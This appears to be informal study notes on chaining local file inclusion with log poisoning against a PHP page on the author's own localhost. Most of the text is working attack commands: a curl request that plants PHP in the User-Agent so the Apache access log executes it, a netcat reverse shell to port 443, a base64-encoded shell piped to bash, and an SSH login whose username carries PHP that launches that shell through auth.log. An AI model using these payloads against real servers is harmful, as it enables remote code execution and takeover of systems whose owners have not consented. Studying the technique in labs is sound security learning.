Log poisoning or Log injection is **a technique that allows the attacker to tamper with the log file contents like inserting the malicious code to the server logs to execute commands remotely or to get a reverse shell**.

One common place were we find log information is on :


```
localhost/example.php?file=/var/log/apache2/access.log
```
NOTE: GENERALLY THIS FILE DO NOT HAVE READING PERMISSIONS.

```
kali>/var/log/apache2/access.log

::1 - - [29/Aug/2023:10:54:01 -0400] "GET /example.php?file=php://filter/convert.base64-encode/resource=example2.php HTTP/1.1" 200 272 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
::1 - - [29/Aug/2023:10:54:01 -0400] "GET /favicon.ico HTTP/1.1" 404 487 "http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
::1 - - [29/Aug/2023:11:02:18 -0400] "GET /example.php?file=/var/log/apache2/access.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"

```




This file shows all the petitions that we did to the apache2 server or any other person did to the apache2 server.

The idea is, that we can take advantage from the USER AGENT.
```
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
```


Why?

from curl we can define the user agent:

-s (silent petition)
-H (headers, we define headers)
```
curl -s -H "User-Agent: <?php system('whoami');?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```


And on the log , we can see something like this 
```
127.0.0.1 - - [29/Aug/2023:11:13:06 -0400] "GET /example.php?file=/var/log/apache2/access.log HTTP/1.1" 200 147 "-" "<?php system('whoami'); ?>"
```
Note; this is not relevant, maybe my machine isnt vulnerable to this but in some cases, the server responses the user, in this case the user is "www-data"

Another important place where we find the logs but, another different logs, SSH.

**/var/log/auth.log**

```
http://localhost/example.php?file=/var/log/auth.log
```

This registers the valid and invalid users.

So we can send us a interactive shell, first 
listening on the port 443
```
nc -nlvp 443
```
and on the other side, on the folder /var/www/html
```
nc -e /bin/bash 127.0.0.1 443
```

Another way coded on base 64

```
echo "nc -e /bin/bash 127.0.0.1 443" | base64; echo
```
copy the base64 and decode it and pipe it with bash

```
echo "vwefewJOIFEE9ij09Ji0ej" | base64 -d | bash

NOTA, NO ES BASE 64 ESO, ES UN FIRULETE NOMAS PARA PONER EJEMPLO
```

now he is going to define it like a "user" 

```
ssh '<?php system("echo vwefewJOIFEE9ij09Ji0ej | base64 -d | bash") ?>'@127.0.0.1
```

Is strange, the user do not exist, but he was able to get on the system as www-data. Because the server interpretes that php command. HE WAS ABLE TO GET BY SSH AS www-data


## This is a LOCAL FILE INCLUSION WITH LOG POISONING STRINGED##
